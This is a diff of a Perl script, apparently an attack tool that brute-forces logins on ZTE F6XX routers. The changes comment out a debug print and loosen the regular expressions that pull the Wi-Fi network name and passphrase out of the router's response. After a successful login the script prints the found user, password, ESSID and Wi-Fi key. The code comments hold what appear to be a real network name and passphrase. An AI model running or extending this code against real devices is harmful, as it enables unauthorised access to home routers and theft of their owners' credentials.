@@ -721,7 +721,7 @@ sub passwordTest
 			my $random_number = int(rand(89999999)) + 10000000;			
 			$password =~ s/\n//g; 	
 			my $hash_md5 = obtener_hash_md5($password.$random_number);
-			print ("Frm_Logintoken $Frm_Logintoken  random_number $random_number hash_md5 $hash_md5");
+			#print ("Frm_Logintoken $Frm_Logintoken  random_number $random_number hash_md5 $hash_md5");
 			my $hash_data = {"frashnum" => "",
 							"action" => "login",
 							"Frm_Logintoken" => $Frm_Logintoken,
@@ -761,8 +761,8 @@ sub passwordTest
 				$decoded_response =~ s/\\x22/"/g; 
 
 				#<script language=javascript>Transfer_meaning('ESSID','JACKBAUTISTA');</script>
-				my $ESSID;
-				$decoded_response =~ /Transfer_meaning\('ESSID','(\w+)'\);/;
+				my $ESSID;				
+				$decoded_response =~ /Transfer_meaning\('ESSID','(.*?)'/;
 				$ESSID = $1;					
 			
 				#get password
@@ -776,8 +776,8 @@ sub passwordTest
 				$decoded_response =~ s/\\x2d/-/g; 
 				$decoded_response =~ s/\\x22/"/g; 
 				
-				#<script language=javascript>Transfer_meaning('KeyPassphrase','coins0591JB');</script>
-				$decoded_response =~ /Transfer_meaning\('KeyPassphrase','(\w+)'\);/;
+				#<script language=javascript>Transfer_meaning('KeyPassphrase','coins0591JB');</script>				
+				$decoded_response =~ /Transfer_meaning\('KeyPassphrase','(.*?)'/;
 				my $KeyPassphrase = $1; 									
 			
 				print "Password encontrado: [ZTE F6XX] $url Usuario:$user Password:$password ESSID $ESSID KeyPassphrase $KeyPassphrase \n";
